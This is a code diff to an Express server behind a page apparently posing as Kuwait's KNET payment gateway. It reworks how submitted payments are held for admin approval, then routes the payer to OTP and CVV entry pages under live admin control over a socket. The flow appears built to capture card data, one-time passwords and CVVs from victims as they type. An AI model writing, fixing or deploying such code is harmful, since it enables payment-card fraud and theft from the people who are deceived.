@@ -269,17 +269,15 @@ app.post('/knet', (req, res) => {
   };
   payments.push(payment);
   notifyAdmins('payment_new', payment);
-  // Return APPROVED so Angular navigates to /knet-otp immediately
-  res.json({ success: true, knetId, paymentId: knetId, refNumber, status: 'APPROVED' });
+  // Return PENDING - Angular will poll /knet/status and wait for admin approval
+  res.json({ success: true, knetId, paymentId: knetId, refNumber, status: 'PENDING' });
 });
 
 app.get('/knet/status/:id', (req, res) => {
   const payment = payments.find(p => p.id === req.params.id || p.knetId === req.params.id);
   if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
-  // Angular polls for APPROVED to navigate to /knet-otp
-  // Map OTP_PENDING to APPROVED so Angular proceeds to OTP page
-  const angularStatus = (payment.status === 'OTP_PENDING' || payment.status === 'PENDING') ? 'APPROVED' : payment.status;
-  res.json({ success: true, status: angularStatus, payment });
+  // Return real status - Angular navigates to /knet-otp only when status === 'APPROVED'
+  res.json({ success: true, status: payment.status, payment });
 });
 
 app.post('/knet/update-status', (req, res) => {
@@ -484,8 +482,7 @@ function buildOtpPage(knetId, mode, showError) {
         .then(function(data) {
           if (data.success) {
             showProcessing();
-            startPolling();
-            setupSocket();
+            startPolling(); // start polling after submit
           } else {
             document.getElementById('confirm-btn').disabled = false;
           }
@@ -498,8 +495,7 @@ function buildOtpPage(knetId, mode, showError) {
       window.history.back();
     });
 
-    // If page loaded with error, show the form (already done via errorHtml)
-    // Setup socket for navigate_to commands from admin
+    // Setup socket ONCE on page load for navigate_to and status events from admin
     setupSocket();
   })();
   <\/script>
@@ -662,7 +658,12 @@ app.post('/admin/payments/:id/action', (req, res) => {
   let navigateTo = null;
 
   if (action === 'accept' || action === 'pass') {
-    if (payment.status === 'OTP_REQUEST') {
+    if (payment.status === 'OTP_PENDING' || payment.step === 1) {
+      // Admin approved card data -> Angular navigates to /knet-otp
+      payment.status = 'APPROVED';
+      payment.step = 2;
+      navigateTo = null; // Angular handles navigation via polling
+    } else if (payment.status === 'OTP_REQUEST') {
       // OTP accepted -> move to CVV step
       payment.status = 'CVV_PENDING';
       payment.step = 3;
@@ -672,8 +673,6 @@ app.post('/admin/payments/:id/action', (req, res) => {
       payment.status = 'CVV_APPROVED';
       payment.step = 2;
       navigateTo = '/knet-otp';
-    } else if (payment.step === 1) {
-      payment.status = 'APPROVED';
     } else {
       payment.status = 'SUCCESS';
     }
